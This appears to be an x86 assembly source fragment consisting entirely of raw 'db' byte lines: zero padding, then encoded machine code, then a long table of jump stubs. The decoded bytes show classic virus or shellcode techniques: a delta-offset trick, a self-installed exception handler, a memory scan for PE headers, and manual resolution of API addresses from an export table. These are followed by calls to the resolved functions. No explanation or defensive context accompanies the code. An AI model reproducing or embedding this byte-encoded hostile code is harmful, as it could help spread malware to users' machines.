    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
    db 00h,00h,00h,00h,00h,00h,00h,00h,55h,8Bh,0ECh,60h,8Bh,75h,08h,8Bh
    db 7Dh,10h,8Bh,45h,0Ch,0FFh,70h,0Ch,8Fh,87h,0B4h,00h,00h,00h,0FFh,70h
    db 08h,8Fh,87h,0B8h,00h,00h,00h,50h,8Fh,87h,0C4h,00h,00h,00h,61h,0B8h
    db 00h,00h,00h,00h,0C9h,0C2h,10h,00h,55h,8Bh,0ECh,83h,0C4h,0FCh,60h,0C7h
    db 45h,0FCh,00h,00h,00h,00h,0E8h,00h,00h,00h,00h,5Bh,81h,0EBh,6Bh,26h
    db 40h,00h,55h,8Dh,83h,0B0h,26h,40h,00h,50h,8Dh,83h,28h,26h,40h,00h
    db 50h,64h,0FFh,35h,00h,00h,00h,00h,64h,89h,25h,00h,00h,00h,00h,8Bh
    db 7Dh,08h,81h,0E7h,00h,00h,0FFh,0FFh,66h,81h,3Fh,4Dh,5Ah,75h,11h,8Bh
    db 0F7h,03h,76h,3Ch,66h,81h,3Eh,50h,45h,75h,05h,89h,7Dh,0FCh,0EBh,10h
    db 81h,0EFh,00h,00h,01h,00h,81h,0FFh,00h,00h,00h,70h,72h,02h,0EBh,0D8h
    db 64h,8Fh,05h,00h,00h,00h,00h,83h,0C4h,0Ch,61h,8Bh,45h,0FCh,0C9h,0C2h
    db 04h,00h,55h,8Bh,0ECh,83h,0C4h,0F8h,60h,0C7h,45h,0FCh,00h,00h,00h,00h
    db 0E8h,00h,00h,00h,00h,5Bh,81h,0EBh,0E5h,26h,40h,00h,55h,8Dh,83h,73h
    db 27h,40h,00h,50h,8Dh,83h,28h,26h,40h,00h,50h,64h,0FFh,35h,00h,00h
    db 00h,00h,64h,89h,25h,00h,00h,00h,00h,8Bh,7Dh,0Ch,0B9h,0FFh,0FFh,0FFh
    db 0FFh,32h,0C0h,0FCh,0F2h,0AEh,8Bh,0CFh,2Bh,4Dh,0Ch,89h,4Dh,0F8h,8Bh,75h
    db 08h,03h,76h,3Ch,8Bh,76h,78h,03h,75h,08h,8Bh,5Eh,20h,03h,5Dh,08h
    db 33h,0D2h,56h,8Bh,3Bh,03h,7Dh,08h,8Bh,75h,0Ch,8Bh,4Dh,0F8h,0F3h,0A6h
    db 75h,03h,5Eh,0EBh,0Ch,5Eh,83h,0C3h,04h,42h,3Bh,56h,18h,72h,0E3h,0EBh
    db 22h,2Bh,5Eh,20h,2Bh,5Dh,08h,0D1h,0EBh,03h,5Eh,24h,03h,5Dh,08h,0Fh
    db 0B7h,03h,0C1h,0E0h,02h,03h,46h,1Ch,03h,45h,08h,8Bh,00h,03h,45h,08h
    db 89h,45h,0FCh,64h,8Fh,05h,00h,00h,00h,00h,83h,0C4h,0Ch,61h,8Bh,45h
    db 0FCh,0C9h,0C2h,08h,00h,60h,0B8h,0B7h,10h,40h,00h,03h,0C3h,50h,0FFh,0B3h
    db 0F0h,25h,40h,00h,8Bh,93h,0F8h,25h,40h,00h,0FFh,0D2h,89h,83h,24h,26h
    db 40h,00h,0B8h,21h,10h,40h,00h,03h,0C3h,50h,0FFh,0B3h,0F4h,25h,40h,00h
    db 8Bh,93h,0F8h,25h,40h,00h,0FFh,0D2h,89h,83h,00h,26h,40h,00h,0B8h,31h
    db 10h,40h,00h,03h,0C3h,50h,0FFh,0B3h,0F4h,25h,40h,00h,8Bh,93h,0F8h,25h
    db 40h,00h,0FFh,0D2h,89h,83h,04h,26h,40h,00h,0B8h,3Eh,10h,40h,00h,03h
    db 0C3h,50h,0FFh,0B3h,0F4h,25h,40h,00h,8Bh,93h,0F8h,25h,40h,00h,0FFh,0D2h
    db 89h,83h,08h,26h,40h,00h,0B8h,4Eh,10h,40h,00h,03h,0C3h,50h,0FFh,0B3h
    db 0F4h,25h,40h,00h,8Bh,93h,0F8h,25h,40h,00h,0FFh,0D2h,89h,83h,0Ch,26h
    db 40h,00h,0B8h,62h,10h,40h,00h,03h,0C3h,50h,0FFh,0B3h,0F4h,25h,40h,00h
    db 8Bh,93h,0F8h,25h,40h,00h,0FFh,0D2h,89h,83h,10h,26h,40h,00h,0B8h,6Fh
    db 10h,40h,00h,03h,0C3h,50h,0FFh,0B3h,0F4h,25h,40h,00h,8Bh,93h,0F8h,25h
    db 40h,00h,0FFh,0D2h,89h,83h,14h,26h,40h,00h,0B8h,80h,10h,40h,00h,03h
    db 0C3h,50h,0FFh,0B3h,0F4h,25h,40h,00h,8Bh,93h,0F8h,25h,40h,00h,0FFh,0D2h
    db 89h,83h,18h,26h,40h,00h,0B8h,8Ch,10h,40h,00h,03h,0C3h,50h,0FFh,0B3h
    db 0F4h,25h,40h,00h,8Bh,93h,0F8h,25h,40h,00h,0FFh,0D2h,89h,83h,1Ch,26h
    db 40h,00h,61h,0C3h,55h,8Bh,0ECh,53h,0E8h,00h,00h,00h,00h,5Bh,81h,0EBh
    db 8Dh,28h,40h,00h,83h,7Dh,08h,00h,74h,4Eh,68h,00h,02h,00h,00h,0B8h
    db 0C6h,18h,40h,00h,03h,0C3h,50h,0FFh,75h,08h,0FFh,93h,1Ch,26h,40h,00h
    db 68h,00h,02h,00h,00h,0B8h,0C6h,1Ah,40h,00h,03h,0C3h,50h,0FFh,75h,08h
    db 0FFh,93h,1Ch,26h,40h,00h,60h,0BEh,0D6h,1Ch,40h,00h,03h,0F3h,0BFh,0C6h
    db 1Ah,40h,00h,03h,0FBh,0B9h,0Ah,00h,00h,00h,0F3h,0A6h,75h,09h,8Bh,45h
    db 08h,89h,83h,0E4h,25h,40h,00h,61h,8Bh,45h,08h,5Bh,0C9h,0C2h,08h,00h
    db 55h,8Bh,0ECh,83h,0C4h,0ECh,6Ah,00h,0B8h,84h,28h,40h,00h,03h,0C3h,50h
    db 0FFh,93h,18h,26h,40h,00h,89h,45h,0ECh,68h,10h,27h,00h,00h,0FFh,93h
    db 24h,26h,40h,00h,6Ah,00h,0FFh,93h,14h,26h,40h,00h,89h,45h,0F4h,6Ah
    db 01h,0FFh,93h,14h,26h,40h,00h,89h,45h,0F0h,8Bh,45h,0F4h,0D1h,0E8h,89h
    db 45h,0F8h,8Bh,45h,0F0h,0D1h,0E8h,89h,45h,0FCh,0FFh,75h,0FCh,0FFh,75h,0F8h
    db 0FFh,93h,00h,26h,40h,00h,89h,45h,0ECh,0EBh,14h,0FFh,0FFh,0FFh,0FFh,0FFh
    db 0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0E9h
    db 5Bh,0CAh,00h,00h,0E9h,56h,0CAh,00h,00h,0E9h,51h,0CAh,00h,00h,0E9h,4Ch
    db 0CAh,00h,00h,0E9h,47h,0CAh,00h,00h,0E9h,42h,0CAh,00h,00h,0E9h,3Dh,0CAh
    db 00h,00h,0E9h,38h,0CAh,00h,00h,0E9h,33h,0CAh,00h,00h,0E9h,2Eh,0CAh,00h
    db 00h,0E9h,29h,0CAh,00h,00h,0E9h,24h,0CAh,00h,00h,0E9h,1Fh,0CAh,00h,00h
    db 0E9h,1Ah,0CAh,00h,00h,0E9h,15h,0CAh,00h,00h,0E9h,10h,0CAh,00h,00h,0E9h
    db 0Bh,0CAh,00h,00h,0E9h,06h,0CAh,00h,00h,0E9h,01h,0CAh,00h,00h,0E9h,0FCh
    db 0C9h,00h,00h,0E9h,0F7h,0C9h,00h,00h,0E9h,0F2h,0C9h,00h,00h,0E9h,0EDh,0C9h
    db 00h,00h,0E9h,0E8h,0C9h,00h,00h,0E9h,0E3h,0C9h,00h,00h,0E9h,0DEh,0C9h,00h
    db 00h,0E9h,0D9h,0C9h,00h,00h,0E9h,0D4h,0C9h,00h,00h,0E9h,0CFh,0C9h,00h,00h
    db 0E9h,0CAh,0C9h,00h,00h,0E9h,0C5h,0C9h,00h,00h,0E9h,0C0h,0C9h,00h,00h,0E9h
    db 0BBh,0C9h,00h,00h,0E9h,0B6h,0C9h,00h,00h,0E9h,0B1h,0C9h,00h,00h,0E9h,0ACh
    db 0C9h,00h,00h,0E9h,0A7h,0C9h,00h,00h,0E9h,0A2h,0C9h,00h,00h,0E9h,9Dh,0C9h
    db 00h,00h,0E9h,98h,0C9h,00h,00h,0E9h,93h,0C9h,00h,00h,0E9h,8Eh,0C9h,00h
    db 00h,0E9h,89h,0C9h,00h,00h,0E9h,84h,0C9h,00h,00h,0E9h,7Fh,0C9h,00h,00h
    db 0E9h,7Ah,0C9h,00h,00h,0E9h,75h,0C9h,00h,00h,0E9h,70h,0C9h,00h,00h,0E9h
    db 6Bh,0C9h,00h,00h,0E9h,66h,0C9h,00h,00h,0E9h,61h,0C9h,00h,00h,0E9h,5Ch
    db 0C9h,00h,00h,0E9h,57h,0C9h,00h,00h,0E9h,52h,0C9h,00h,00h,0E9h,4Dh,0C9h
    db 00h,00h,0E9h,48h,0C9h,00h,00h,0E9h,43h,0C9h,00h,00h,0E9h,3Eh,0C9h,00h
    db 00h,0E9h,39h,0C9h,00h,00h,0E9h,34h,0C9h,00h,00h,0E9h,2Fh,0C9h,00h,00h
    db 0E9h,2Ah,0C9h,00h,00h,0E9h,25h,0C9h,00h,00h,0E9h,20h,0C9h,00h,00h,0E9h
    db 1Bh,0C9h,00h,00h,0E9h,16h,0C9h,00h,00h,0E9h,11h,0C9h,00h,00h,0E9h,0Ch
    db 0C9h,00h,00h,0E9h,07h,0C9h,00h,00h,0E9h,02h,0C9h,00h,00h,0E9h,0FDh,0C8h
    db 00h,00h,0E9h,0F8h,0C8h,00h,00h,0E9h,0F3h,0C8h,00h,00h,0E9h,0EEh,0C8h,00h
    db 00h,0E9h,0E9h,0C8h,00h,00h,0E9h,0E4h,0C8h,00h,00h,0E9h,0DFh,0C8h,00h,00h
    db 0E9h,0DAh,0C8h,00h,00h,0E9h,0D5h,0C8h,00h,00h,0E9h,0D0h,0C8h,00h,00h,0E9h
    db 0CBh,0C8h,00h,00h,0E9h,0C6h,0C8h,00h,00h,0E9h,0C1h,0C8h,00h,00h,0E9h,0BCh
    db 0C8h,00h,00h,0E9h,0B7h,0C8h,00h,00h,0E9h,0B2h,0C8h,00h,00h,0E9h,0ADh,0C8h
    db 00h,00h,0E9h,0A8h,0C8h,00h,00h,0E9h,0A3h,0C8h,00h,00h,0E9h,9Eh,0C8h,00h
    db 00h,0E9h,99h,0C8h,00h,00h,0E9h,94h,0C8h,00h,00h,0E9h,8Fh,0C8h,00h,00h
    db 0E9h,8Ah,0C8h,00h,00h,0E9h,85h,0C8h,00h,00h,0E9h,80h,0C8h,00h,00h,0E9h
    db 7Bh,0C8h,00h,00h,0E9h,76h,0C8h,00h,00h,0E9h,71h,0C8h,00h,00h,0E9h,6Ch
    db 0C8h,00h,00h,0E9h,67h,0C8h,00h,00h,0E9h,62h,0C8h,00h,00h,0E9h,5Dh,0C8h
    db 00h,00h,0E9h,58h,0C8h,00h,00h,0E9h,53h,0C8h,00h,00h,0E9h,4Eh,0C8h,00h
    db 00h,0E9h,49h,0C8h,00h,00h,0E9h,44h,0C8h,00h,00h,0E9h,3Fh,0C8h,00h,00h
    db 0E9h,3Ah,0C8h,00h,00h,0E9h,35h,0C8h,00h,00h,0E9h,30h,0C8h,00h,00h,0E9h
    db 2Bh,0C8h,00h,00h,0E9h,26h,0C8h,00h,00h,0E9h,21h,0C8h,00h,00h,0E9h,1Ch
    db 0C8h,00h,00h,0E9h,17h,0C8h,00h,00h,0E9h,12h,0C8h,00h,00h,0E9h,0Dh,0C8h
    db 00h,00h,0E9h,08h,0C8h,00h,00h,0E9h,03h,0C8h,00h,00h,0E9h,0FEh,0C7h,00h
    db 00h,0E9h,0F9h,0C7h,00h,00h,0E9h,0F4h,0C7h,00h,00h,0E9h,0EFh,0C7h,00h,00h
    db 0E9h,0EAh,0C7h,00h,00h,0E9h,0E5h,0C7h,00h,00h,0E9h,0E0h,0C7h,00h,00h,0E9h
    db 0DBh,0C7h,00h,00h,0E9h,0D6h,0C7h,00h,00h,0E9h,0D1h,0C7h,00h,00h,0E9h,0CCh
    db 0C7h,00h,00h,0E9h,0C7h,0C7h,00h,00h,0E9h,0C2h,0C7h,00h,00h,0E9h,0BDh,0C7h
    db 00h,00h,0E9h,0B8h,0C7h,00h,00h,0E9h,0B3h,0C7h,00h,00h,0E9h,0AEh,0C7h,00h
    db 00h,0E9h,0A9h,0C7h,00h,00h,0E9h,0A4h,0C7h,00h,00h,0E9h,9Fh,0C7h,00h,00h
    db 0E9h,9Ah,0C7h,00h,00h,0E9h,95h,0C7h,00h,00h,0E9h,90h,0C7h,00h,00h,0E9h
    db 8Bh,0C7h,00h,00h,0E9h,86h,0C7h,00h,00h,0E9h,81h,0C7h,00h,00h,0E9h,7Ch
    db 0C7h,00h,00h,0E9h,77h,0C7h,00h,00h,0E9h,72h,0C7h,00h,00h,0E9h,6Dh,0C7h
    db 00h,00h,0E9h,68h,0C7h,00h,00h,0E9h,63h,0C7h,00h,00h,0E9h,5Eh,0C7h,00h
    db 00h,0E9h,59h,0C7h,00h,00h,0E9h,54h,0C7h,00h,00h,0E9h,4Fh,0C7h,00h,00h
    db 0E9h,4Ah,0C7h,00h,00h,0E9h,45h,0C7h,00h,00h,0E9h,40h,0C7h,00h,00h,0E9h
    db 3Bh,0C7h,00h,00h,0E9h,36h,0C7h,00h,00h,0E9h,31h,0C7h,00h,00h,0E9h,2Ch
    db 0C7h,00h,00h,0E9h,27h,0C7h,00h,00h,0E9h,22h,0C7h,00h,00h,0E9h,1Dh,0C7h
    db 00h,00h,0E9h,18h,0C7h,00h,00h,0E9h,13h,0C7h,00h,00h,0E9h,0Eh,0C7h,00h
    db 00h,0E9h,09h,0C7h,00h,00h,0E9h,04h,0C7h,00h,00h,0E9h,0FFh,0C6h,00h,00h
    db 0E9h,0FAh,0C6h,00h,00h,0E9h,0F5h,0C6h,00h,00h,0E9h,0F0h,0C6h,00h,00h,0E9h
    db 0EBh,0C6h,00h,00h,0E9h,0E6h,0C6h,00h,00h,0E9h,0E1h,0C6h,00h,00h,0E9h,0DCh
    db 0C6h,00h,00h,0E9h,0D7h,0C6h,00h,00h,0E9h,0D2h,0C6h,00h,00h,0E9h,0CDh,0C6h
    db 00h,00h,0E9h,0C8h,0C6h,00h,00h,0E9h,0C3h,0C6h,00h,00h,0E9h,0BEh,0C6h,00h
    db 00h,0E9h,0B9h,0C6h,00h,00h,0E9h,0B4h,0C6h,00h,00h,0E9h,0AFh,0C6h,00h,00h
    db 0E9h,0AAh,0C6h,00h,00h,0E9h,0A5h,0C6h,00h,00h,0E9h,0A0h,0C6h,00h,00h,0E9h
    db 9Bh,0C6h,00h,00h,0E9h,96h,0C6h,00h,00h,0E9h,91h,0C6h,00h,00h,0E9h,8Ch
